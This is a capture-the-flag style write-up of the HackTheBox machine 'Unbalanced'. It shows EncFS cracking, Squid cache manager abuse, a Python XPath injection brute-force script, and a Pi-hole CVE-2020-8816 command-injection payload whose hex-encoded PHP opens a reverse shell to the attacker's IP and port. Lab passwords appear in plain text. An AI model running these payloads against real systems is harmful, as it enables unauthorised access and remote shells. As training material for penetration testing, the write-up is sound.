---
title: HackTheBox - Unbalanced 
category: writeup
tags: hackthebox
---
# Summary
Unbalanced was a hard rated machine on HackTheBox which involved retrieving files from rsync and decrypting the contents after which we use the squid proxy to access an internal network with multiple load balancers one of which is vulnerable to a XPATH injection attack allowing us to enumerate users and passwords. Using them we log into the box and get the user flag. The privilege escalation involves using a public exploit on a pi-hole instance which gives us a reverse shell on a docker container through which we find the root password in a bash script allowing us to su to root.

This was a very hard machine which taught me a lot about XPATH and about how there is more than what meets the eye. It took me over 4 days of just doing things to get the machine which was fun and painful at the same time.

## NMAP

The nmap scan reaveals the following:

```bash
PORT     STATE SERVICE    REASON         VERSION                            
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                                         
| 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)    
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/YjsyMxXIT238iuTCGqvn1d8V8qA+GvRq0I0id9OfyIc7TZ2UKakBUQmNJFQ7GxheeKK4w+hqWxJm3aytFXuMOU2m/6osew7yT/pOu2cgnXWGCJX0BoyQcjPR6RD2vNQLlS5ALwD2g1qRDKfC1G99s0id+1TsQVwteLvk+Lsv
1FAQ6YYzkfoSR9dGXvx7DPH8ifVsFWfyLsMSd7aW7QRC0tNBl67J4bC9YLQeNjbt0jKul3ClfSc53fYznIUMIsEBGbqVmuBx/ce2uwThAXfMkGiombhkCuMxKNW6tj1gHYPispkzvFk9CP3zWWSFAvfCjOc10bEGbUfXIN5612dZ
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)        
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ1LlzLG7OYXlmwZROwufoiMb7DoMBUkPbQGUgTlgn0g9TzcPZCPH8vQ6IoA/0Lyl9AzwAAyN+29Z6BT1k+AtyM=
|   256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDqAge8JZ7KRtCKOk+gsSG+VC/SqyaVl3WY44LwYfv+
873/tcp  open  rsync      syn-ack ttl 63 (protocol version 31)
3128/tcp open  http-proxy syn-ack ttl 63 Squid http proxy 4.6
|_http-server-header: squid/4.6                                                    
|_http-title: ERROR: The requested URL could not be retrieved
```

## RSYNC

Checking RSYNC reveals the following.

```bash
root@kali:/home/kali/Desktop/Pentesting/hackthebox/unbalanced# rsync -av --list-only rsync://10.10.10.200
conf_backups EncFS-encrypted configuration backups

rsync -av rsync://10.10.10.200/conf_backups ./rsync/
```

After downloading the shared directory we can take a look inside and see that the contents are encrypted. 

Following the following article explains how to decrypt the contents of the directory.

[Breaking EncFS given .encfs6.xml](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml)

## Cracking the password

```bash
root@kali:/home/kali/Desktop/Pentesting/hackthebox/unbalanced# john --wordlist=/usr/share/wordlists/rockyou.txt encfs.xml.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 128/128 AVX 4x AES])
Cost 1 (iteration count) is 580280 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bubblegum        (./rsync/conf_backups/)
1g 0:00:00:23 DONE (2020-08-01 20:17) 0.04310g/s 31.03p/s 31.03c/s 31.03C/s bambam..marissa
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Attempting to decrypt the password for the encfs folder we get the password `bubblegum`.

```bash
encfs $(pwd)/conf_backups/ $(pwd)/encfs-encrypted/
```

Using the above command we can mount the directory.

## squid.conf

Earlier in the NMAP scan I noticed the squid proxy listening so I wanted to check out what was inside the `squid.conf` hoping to find some credentials.

Checking for strings that don't start with a comment are grepped for 

`grep -Ev '^#' squid.conf | grep -v -e '^$'`

We come across this line where there is a password in the file.

```bash
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events

acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
```

Looking further we also see that there is a mention of a hostname `intranet.unbalanced.htb` which we can add to our /etc/hosts file.

We also can see that the intranet destination address is in the `172.16.0.0/12` range which has over $2^n$ addresses where n is the remaining bits out of the possible 32 bits i.e. 2^20 = `1,048,576` possible hosts. So, its safe to assume that the intended method does not involve trying to discover the hosts using a nmap scan.

## Trying to access cache manager

In the above `squid.conf` file we see that there is a cache manager that we have the password to which might leak some interesting information for us. However, we don't have a username yet. I spent a lot of time trying some usernames and someone gave me a small hint which was "Check the file carefully" at that point I started going through the file again grepping for the string `user` which revealed the following line:

```html
# cache_effective_user proxy
```

We might have a potential username for the proxy.

Using the above information we can follow the following 

[14.2 The Cache Manager](http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/)

page and see what is happening.

```html
squidclient -h unbalanced.htb -U proxy -W 'Thah$Sh1' -p 3128 mgr:menu
```

In the squid config file the fqdncache commands seems to be enabled. 

Attempting to read the data from the fqdncache gives the following output:

```html
Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

We now have multiple addresses for the intranet on unbalanced.

# Intranet Enumeration

The intranet 2 and 3 are in the file which is peculiar as there is no `intranet-host1.unbalanced.htb` and it would be safe to assume that it sits on the `172.31.179.1` ip address. We can confirm this by using the squid proxy in firefox using foxy proxy to connect to that IP address.

Attempting to access the page gives us the following message.

```html
Host temporarily taken out of load balancing for security maintenance.
```

Attempting to access the `.2` address redirects us to a intranet.php file which might exist on the first instance as well.

Checking the intranet.php on `.1` gives us a hit.

Attempting a SQL injection on the password field dumps the usernames.

```html
' or '1'='1

rita@unbalanced.htb
jim@unbalanced.htb
bryan@unbalanced.htb
sarah@unbalanced.htb
```

At this stage I was going down a rabbit hole of attempting a SQL injection to no avail and got a hint on the HTB forums that its not a SQL injection but a different kind of injection, which makes sense as to why my earlier payload of `' or 1=1-- -` did not work.

Going through the list of possible injection vectors I came across this [article](https://www.acunetix.com/vulnerabilities/web/xpath-injection-vulnerability/) which mentioned XPATH injection and it made the most sense that the injection I was looking for was a XPath injection as the payloads used of XPath seemed to dump information using the payloads found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection).

Now we know what kind of injection we need to perform and a field that we need to inject ex. `Password` which can be seen in the post request through either the network tab or just intercepting with `burp` by setting an upstream proxy.

## XPATH injection

There are different ways we could have enumerated the password for the users on the system by either using a substring or with starts with query.

Starts with query seemed the easiest to me personally as it would require us to know the least amount of information as a simple `' or starts-with(\"strint-to-test\") or '` would evaluate to true if it does not give us a Invalid Password message.

With all of this information we can create a small python script that uses the proxy to send data to the page.

Using the XPATH injection and enum we find the password for Brian:

```python
import requests
import string
proxies = {
 "http": "http://10.10.10.200:3128"
}
password = ""
found_char = False
i = 0
badchars = ['"', "'"]
while i < len(string.printable):
        test = password + string.printable[i]
        print("\rTesting: " + test, end="", flush=True)
        payload = "' or starts-with(Password, \"" + test +"\") or '"

        data = {
                "Username":payload,
                "Password":payload
        }

        r = requests.post("http://172.31.179.1/intranet.php", proxies=proxies,data=data)
        # Quotes break everything 
        if string.printable[i] not in badchars:

                if "Invalid" not in r.text:
                        password += string.printable[i]
                        print("\rTesting: " + test, end="", flush=True)
                        found_char = True
                        i = 0
                elif i == len(string.printable) - 1 and found_char==False:
                        break
                else:
                        i += 1
```

Letting the script run for a while gives us the password `ireallyl0vebubblegum!!!`

## SSH

We can use the password to attempt to log in as the users found earlier and we are able to get in as the user `bryan`.

```html
bryan@unbalanced:~$ cut  -c 1-16 user.txt;whoami
b1d2409071d087cc
bryan
```

## Privilege Escalation

Checking Bryans home directory shows a TODO file that mentions a PIHOLE being installed on the machine only exposed to localhost.

Checking the open ports reveals port 8080 which we can forward over to our machine using the current SSH connection by hitting `enter + ~ + shift + c`

```html
ssh> -L 8080:127.0.0.1:8080
Forwarding port.
```

Checking [localhost](http://localhost) port 8080 which gives us the following error message:

```html
[ERROR]: Unable to parse results from queryads.php: Unhandled error message (Invalid domain!)
```

Checking this error in google reveals that it is indeed a problem with the pi-hole and just hitting the /admin endpoint works fine as outlined in a comment on this [github issue](https://github.com/pi-hole/docker-pi-hole/issues/224) .

Using the password admin we can log into the pi-hole and see what is going on.

At the bottom of the page we see that the pi-hole version is 4.3.2 which is a version vulnerable to a remote code execution attack.

Downloading the exploit script from exploit.db found [here](https://www.exploit-db.com/exploits/48442) and a in depth explanation of the vulnerability can be found [here](https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/). We can use the following script to get a reverse shell as the user running the pi-hole service.

However, using the script does not work for us instead we can attempt to used the same payload as used in the technical analysis.

All we need to do is make sure that the quotes are replaced to ascii quotes and replace the hex payload which can be done using cyberchef.

Our payload would look something like this:

```html
aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e3336222c39303031293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
```

Following the steps in the technical breakdown we get a reverse shell as www-data.

## Root

As the user www-data we can read `/root` directory inside of which there is a config script containing a password.

```python
cat pihole_config.sh 
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

We can use this password to su to root on the victim machine and grab the root flag.

```bash
bryan@unbalanced:~$ su root
Password: bUbBl3gUm$43v3Ry0n3!
root@unbalanced:/home/bryan# whoami
root
```
